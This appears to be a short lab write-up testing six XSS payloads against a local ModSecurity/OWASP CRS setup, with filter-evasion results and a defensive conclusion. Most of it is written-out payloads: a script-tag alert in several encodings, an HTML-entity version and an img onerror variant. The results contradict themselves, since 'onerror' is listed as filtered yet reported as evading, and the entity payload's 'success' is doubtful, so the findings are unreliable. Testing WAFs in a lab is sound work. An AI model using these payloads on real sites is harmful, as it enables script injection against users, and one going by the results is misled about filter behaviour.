# XSS Payload Evasion with WAF Character-based Filters

## Setup

- **Web Application**: Sample application hosted locally with basic input fields vulnerable to XSS.
- **WAF**: ModSecurity with OWASP Core Rule Set (CRS).
- **Filters**: Enabled character-based filtering for common XSS patterns (e.g., `<script>`, `alert`, `onerror`).

## Payloads Tested

1. **Basic Payload**:
   - `<script>alert("XSS")</script>`
   - **Result**: Blocked by WAF.

2. **URL Encoded Payload**:
   - `%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E`
   - **Result**: Blocked by WAF.

3. **Hexadecimal Encoding**:
   - `%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%58%53%53%22%29%3c%2f%73%63%72%69%70%74%3e`
   - **Result**: Blocked by WAF.

4. **UTF-16 Encoding**:
   - `%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0022%u0058%u0053%u0053%u0022%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e`
   - **Result**: Blocked by WAF.

5. **HTML Entities**:
   - `&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;`
   - **Result**: Evaded WAF.

6. **Alternative Syntax**:
   - `<img src=x onerror=alert("XSS")>`
   - **Result**: Evaded WAF.

## Conclusion

The payloads using HTML entities and alternative syntax successfully evaded the character-based filters of the WAF. This highlights the limitations of simple character-based filtering and underscores the need for more robust XSS protection mechanisms.

